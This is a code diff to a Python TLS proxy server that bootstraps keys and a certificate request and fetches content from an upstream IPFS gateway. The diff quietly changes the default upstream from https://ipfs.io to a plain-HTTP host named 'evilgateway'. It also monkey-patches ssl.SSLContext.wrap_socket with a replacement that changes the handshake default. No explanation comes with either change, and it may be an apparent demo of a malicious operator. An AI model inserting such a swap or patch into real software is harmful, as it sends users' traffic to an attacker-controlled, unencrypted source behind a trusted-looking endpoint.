@@ -123,7 +123,7 @@ def generate_keys_and_csr():
         print(f"[Bootstrap] Stored private key in {public_key_path}")
         # print(f"[Bootstrap] Public key: {public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)}")
 
-    DOMAIN_NAME = u"item4.ln.soc1024.com"
+    DOMAIN_NAME = u"item9.ln.soc1024.com"
     # Create a CSR
     csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
         x509.NameAttribute(NameOID.COMMON_NAME, DOMAIN_NAME)
@@ -250,17 +250,34 @@ def perform_diffie_hellman(client_public_key_pem):
 
     return derived_key
 
+def wrap_socket(self, sock, server_side=False,
+                    do_handshake_on_connect=False,
+                    suppress_ragged_eofs=True,
+                    server_hostname=None, session=None):
+        # SSLSocket class handles server_hostname encoding before it calls
+        # ctx._wrap_socket()
+        return self.sslsocket_class._create(
+            sock=sock,
+            server_side=server_side,
+            do_handshake_on_connect=do_handshake_on_connect,
+            suppress_ragged_eofs=suppress_ragged_eofs,
+            server_hostname=server_hostname,
+            context=self,
+            session=session
+        )
+
 if __name__ == '__main__':
     
     parser = argparse.ArgumentParser()
-    parser.add_argument('--port', type=int, default=8083, help='Port to run the server on')
-    parser.add_argument('--gateway', default='https://ipfs.io', help='Upstream gateway to use')
+    parser.add_argument('--port', type=int, default=8085, help='Port to run the server on')
+    parser.add_argument('--gateway', default='http://evilgateway.ln.soc1024.com', help='Upstream gateway to use')
     # Add the bootstrap_mode argument
     parser.add_argument('--bootstrap_mode', action='store_true', help='Generate public and private keys if set')
     parser.add_argument('--bootstrap_link', type=str, help='Link to boostrap node, if not bootstrapping.')
 
     args = parser.parse_args()
 
+    gateway = args.gateway
     has_bootstrapped = False
 
     # Check if bootstrap_mode is set to True
@@ -283,6 +300,7 @@ if __name__ == '__main__':
     
     # Create an HTTP server with the SSL-wrapped socket
     # Create an SSL context
+    ssl.SSLContext.wrap_socket = wrap_socket
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain(CERTIFICATE_PATH, PRIVATE_KEY_PATH)
 
